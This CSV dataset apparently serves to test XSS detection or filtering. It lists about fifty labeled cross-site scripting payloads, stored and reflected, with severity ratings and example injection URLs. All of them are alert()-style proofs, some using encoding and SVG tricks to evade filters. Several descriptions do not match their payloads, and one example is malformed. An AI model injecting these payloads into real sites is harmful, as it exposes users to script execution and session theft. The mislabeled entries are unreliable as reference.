id,label,attack_class,type,payload,context,context_bucket,severity,severity_original,severity_reason,is_destructive,destructive_flags,oracle,description,example
xss-019,attack,xss,stored,<textarea onfocus=alert('XSS19')>Focus me</textarea>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with textarea and onfocus event,User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,attack,xss,reflected,"<math href='javascript:alert(""XSS20"")'>X</math>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with math tag and href attribute,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,attack,xss,reflected,"<base href=""javascript:alert('XSS21');//"">",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with base tag and href attribute,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,attack,xss,stored,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with anchor tag and onclick event,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,attack,xss,reflected,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with meta tag and content attribute,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,attack,xss,stored,"<button onclick='alert(""XSS24"")'>Click</button>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with button tag and onclick event,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,attack,xss,reflected,<form onreset=alert('XSS25')><input type='reset'></form>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with form tag and onreset event,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,attack,xss,stored,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with marquee tag and onstart event,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,attack,xss,reflected,"<embed src='javascript:alert(""XSS27"")'>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with embed tag and src attribute,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,attack,xss,stored,"<bgsound src='javascript:alert(""XSS28"")'>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with bgsound tag and src attribute,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,attack,xss,reflected,<xml onload=alert('XSS29')>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with xml tag and onload event,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-030,attack,xss,stored,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with iframe and onload event,"User input: <iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,attack,xss,reflected,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using SVG with animate element and begin attribute,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,attack,xss,stored,"<base href=""javascript:alert('XSS32');//"">",User profile input,profile_form,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using JavaScript URI in base tag,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,attack,xss,reflected,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using malformed iframe with srcdoc and encoded script,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,attack,xss,stored,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using onpointerover event in div,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,attack,xss,reflected,<script>alert(XSS35)</script>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using malformed script tag with backticks,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,attack,xss,stored,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using SVG foreignObject with embedded HTML and script,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,attack,xss,reflected,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using onanimationstart event in div,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,attack,xss,stored,"<input oninput='alert(""XSS38"")'>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using input tag with oninput event,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,attack,xss,reflected,<script>eval(alert('XSS39'))</script>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using malformed script with template literals,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,attack,xss,stored,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using object tag with data URI,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,attack,xss,reflected,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using onpointerdown event in span,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,attack,xss,stored,"<math href='javascript:alert(""XSS42"")'>X</math>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using math tag with href attribute and javascript URI,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,attack,xss,reflected,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using iframe with sandbox attribute bypass,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,attack,xss,stored,"<video oncanplay='alert(""XSS44"")'></video>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using video tag with oncanplay event,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,attack,xss,reflected,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using meta tag with refresh and encoded javascript URI,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,attack,xss,stored,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using svg with set attribute and onbegin event,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,attack,xss,reflected,"<script>setTimeout('alert(""XSS47"")',0)</script>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using malformed script with setTimeout,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,attack,xss,stored,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using details tag with ontoggle event,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,attack,xss,reflected,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using input tag with formaction attribute,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,attack,xss,stored,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,attack,xss,reflected,"<script>setInterval(function(){alert('XSS51')},1000)</script>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using script tag with setInterval,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,attack,xss,stored,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using iframe with onload and srcdoc,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,attack,xss,reflected,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using svg with onload and script tag,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,attack,xss,stored,"<iframe src='javascript:alert(""XSS54"")'></iframe>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using iframe with src set to javascript URI,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,attack,xss,reflected,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using object tag with type attribute and data URI,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,attack,xss,stored,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using svg with onload and setTimeout,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,attack,xss,reflected,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using iframe with srcdoc and encoded script,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,attack,xss,stored,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using svg with animateTransform and onbegin event,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,attack,xss,reflected,"<script>Function('alert(""XSS59"")')()</script>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using script tag with Function constructor,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-060,attack,xss,stored,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using iframe with onload and encoded srcdoc,"User input: <iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,attack,xss,reflected,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using SVG with feImage and onload event,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,attack,xss,stored,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using details tag with ontoggle event and script,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,attack,xss,reflected,"<math href='javascript:alert(""XSS63"")'>X</math>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using math tag with href attribute and javascript URI,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,attack,xss,stored,"<audio src='x' onerror='alert(""XSS64"")'></audio>",User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS using audio tag with onerror event,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,attack,xss,reflected,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS using iframe with srcdoc and onload event,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
